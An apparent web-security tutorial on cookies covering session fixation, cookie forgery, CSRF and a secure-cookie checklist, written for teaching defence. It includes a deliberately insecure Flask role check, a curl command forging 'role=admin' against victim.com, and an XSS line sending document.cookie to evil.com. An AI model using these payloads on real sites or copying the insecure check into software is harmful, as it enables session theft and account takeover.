Module 01

What Are Cookies?

🍪
Definition
Cookies are small key-value text strings stored in the browser and automatically sent with every HTTP request to the originating domain. They let servers remember stateless HTTP connections — like recognizing you after you log in.
📦
How They're Set
The server sends a Set-Cookie header in its HTTP response. The browser saves the cookie and automatically attaches it in the Cookie header on every future request to that domain.
🔄
Lifecycle
Session cookies vanish when the tab closes. Persistent cookies live until their Expires or Max-Age is reached. If neither is set, the cookie is treated as a session cookie.
⚠️
Why They're Sensitive
Cookies often carry session tokens. If an attacker steals or forges one, they can impersonate you without ever knowing your password. This is why cookie security attributes exist.
🗂️
Common Uses
Session management (sessionid), authentication tokens (auth_token), user preferences, shopping carts, CSRF tokens, A/B testing flags, and analytics tracking.

Module 05

Cookie Injection Attack — Live Simulation

An attacker intercepts or manipulates a cookie to impersonate another user or escalate privileges. This happens when the server trusts cookie values blindly without signing or validating them. Walk through each step of the attack below.

🎯 The Vulnerable Server Code

This server trusts a cookie called role directly without verifying its authenticity.

# Python / Flask — INSECURE example
@app.route("/admin")
def admin_panel():
  role = request.cookies.get("role")
  if role == "admin": # ← NEVER DO THIS
    return render("admin.html")
  return "Access denied", 403
⚠️ The server never verifies the cookie was set by itself. An attacker can write any value to it.

💀 The Attack

The attacker simply opens DevTools → Application → Cookies and changes the role value.

// In browser DevTools console:
document.cookie = "role=admin";

// Or via curl to bypass browser:
curl -H "Cookie: role=admin"
     https://victim.com/admin
💥 Admin panel is now accessible. Full account takeover.

✅ Fix: Never trust client-supplied role/permission values. Store roles server-side (in a database keyed to a cryptographically signed session ID). Use HMAC-signed cookies or JWTs with signature verification.

🎯 Session Fixation Explained

The attacker provides the victim with a session ID before they log in. The server accepts it, so after login the attacker already knows the valid session ID.

Step 1 — Attacker gets a pre-auth session
Visits login page: server issues SESSID=AAAA1111
Step 2 — Victim receives fixed session
Attacker tricks victim into clicking a link with the session baked in (URL param, or sets cookie via XSS).
Step 3 — Victim logs in
Server authenticates victim but keeps the same session ID instead of generating a new one.
Step 4 — Attacker is now logged in too
Sends SESSID=AAAA1111 — server thinks it's the victim. Full account access.

✅ The Fix

The server must regenerate the session ID upon successful authentication. This is one line in most frameworks:

# Python / Flask-Login
login_user(user)
# Regenerate session to prevent fixation:
session.regenerate()

# PHP
session_regenerate_id(true);

# Express.js
req.session.regenerate(callback);
✅ After regeneration, the attacker's old SESSID is invalid. The new ID is only known to the legitimate user's browser.
ℹ️ Also bind sessions to IP + User-Agent to detect theft, and set short session timeouts.

🎯 Cookie Forgery via Weak Encoding

Some apps store data like username or isAdmin directly in the cookie using Base64 — which is encoding, not encryption. Anyone can decode and re-encode.

# Server sets this insecurely:
user_data = {"user": "alice", "admin": false}
cookie = base64(json.dumps(user_data))
# → eyJ1c2VyIjogImFsaWNlIiwgImFkbWluIjogZmFsc2V9

# Attacker decodes, modifies, re-encodes:
evil = {"user": "alice", "admin": true}
forged = base64(json.dumps(evil))

✅ The Fix — HMAC Signing

Sign the cookie with a secret key. Any tampering invalidates the signature. This is what Flask's signed sessions and JWT do.

import hmac, hashlib, base64

def sign(data, secret):
  sig = hmac.new(
    secret.encode(),
    data.encode(),
    hashlib.sha256
  ).hexdigest()
  return f"{data}.{sig}"

def verify(signed, secret):
  data, sig = signed.rsplit(".", 1)
  return sign(data, secret) == signed
✅ Attacker cannot forge a valid signature without the server's secret key. Tampering = signature mismatch = rejected.

Module 06

Common Cookie Attack Patterns

🦠
XSS → Cookie Theft
If HttpOnly is missing, an XSS payload can do fetch('evil.com?c='+document.cookie) to exfiltrate all cookies to an attacker's server. The attacker replays the stolen session token and is instantly logged in as the victim.
🎭
CSRF via SameSite=None
A malicious page on evil.com submits a hidden form to bank.com/transfer. If the session cookie has SameSite=None, the browser includes it automatically. The bank sees a valid session and executes the transfer.
🕵️
MITM Sniffing
On an unencrypted HTTP connection, a network attacker (e.g. same WiFi) can read all headers including Cookie:. The Secure flag prevents the browser from ever sending the cookie over HTTP.
🔧
Subdomain Injection
If an XSS exists on sub.example.com, it can set a cookie with Domain=example.com, which then gets sent to the main app. The __Host- prefix prevents this by disallowing the Domain attribute entirely.
Module 07

Secure Cookie Checklist

✅ Do This
Use HttpOnly on session cookies
JavaScript never needs to read the session token.
Use Secure flag
Force HTTPS-only transmission for all sensitive cookies.
Set SameSite=Strict or Lax
Lax is the modern browser default; Strict is safer for sensitive actions.
Sign cookie values with HMAC
Detect any tampering. Never store trust data (role, isAdmin) unsigned.
Regenerate session ID on login
Prevents session fixation attacks.
Set short, appropriate expiry
Long-lived sessions increase exposure window. Use refresh tokens.
❌ Never Do This
Store roles/permissions in cookies
Never trust role=admin from the client. Store it server-side.
Use Base64 as "encryption"
Base64 is trivially reversible. It's encoding, not security.
Set SameSite=None without Secure
Modern browsers reject it, and old ones are vulnerable to CSRF.
Use predictable session IDs
Use cryptographically secure random generators (e.g. secrets.token_hex(32)).
Store sensitive data in plain cookies
Even encrypted client-side storage can be replayed. Keep secrets server-side.
Forget to delete cookies on logout
Set Max-Age=0 to immediately expire the session cookie server-side.

🎯 Key Takeaway
Cookies are just strings. The server must never trust their content without cryptographic verification. Always sign, validate server-side, and apply all security flags to sensitive cookies.
